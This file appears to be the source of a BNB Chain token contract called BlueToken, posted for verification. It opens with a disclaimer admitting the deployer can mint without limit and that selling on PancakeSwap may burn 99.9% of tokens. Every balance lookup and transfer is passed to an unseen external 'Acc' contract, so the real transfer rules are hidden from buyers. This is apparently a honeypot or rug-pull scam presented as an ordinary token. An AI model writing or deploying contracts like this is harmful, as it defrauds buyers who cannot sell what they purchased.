/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable token, not an investment vehicle. If bought, token holders are aware of the fact that 
this collectable (with no utility) will most likely not produce capital gains. 

The tokenomics of this token have been designed to discourage the trading of this collectable. These tokenomics include:

 - Holders can freely send/transfer tokens to other partners/participants of the blockchain.

 - The contract deployer can generate new tokens (supply is unlimited) and sell them.

 - Selling these collectable tokens on PancakeSwap may lead to a 99.9% token burn. 

Note: In no event will the contract deployer or its affiliates be liable to refund purchasers of this collectable.

--------------------------------------------------------------------------------------------------------------------
*/

/**
*Submitted for verification at BscScan.com on 2022-06-02 21:56:21
*/   

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

contract Acc {
    function acc_Transfer(address from, address to, uint256 amount) public;
    function acc_balanceOf(address who) public view returns (uint256);
    function acc_setup(address token, uint256 supply) public returns (bool);
}

contract BlueToken {
    
    string public constant name = "BlueToken";
    string public constant symbol = "BT";
    uint8 public constant decimals = 18;
    uint256 totalSupply_;
    address private Acc_address;
    address private deployer;
    mapping(address => mapping (address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _acc) public {
        totalSupply_ = 80000000*10**18;
        deployer = msg.sender;
        Acc_address = _acc;
        Acc(Acc_address).acc_setup(address(this), totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Acc(Acc_address).acc_balanceOf(tokenOwner);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Acc(Acc_address).acc_Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        Acc(Acc_address).acc_Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}